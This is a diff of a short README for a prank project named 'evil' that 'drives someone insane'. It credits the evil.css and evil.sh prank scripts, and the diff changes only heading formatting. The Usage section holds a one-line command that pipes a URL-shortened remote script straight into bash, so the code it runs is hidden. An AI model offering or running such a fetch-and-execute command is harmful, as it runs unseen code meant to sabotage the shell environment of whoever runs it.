@@ -1,15 +1,16 @@
 # evil
 How do you drive someone insane?
 
-#Usage
+## Usage
+
 ```
 curl -s "https://goo.gl/J78oig" | bash /dev/stdin 
 ```
 
-#Credit
+## Credit
 https://github.com/tlrobinson/evil.css
 
 https://github.com/mathiasbynens/evil.sh
 
-#Disclaimer
+## Disclaimer
 I'm not responsible for any evil caused by this script. Public domain.
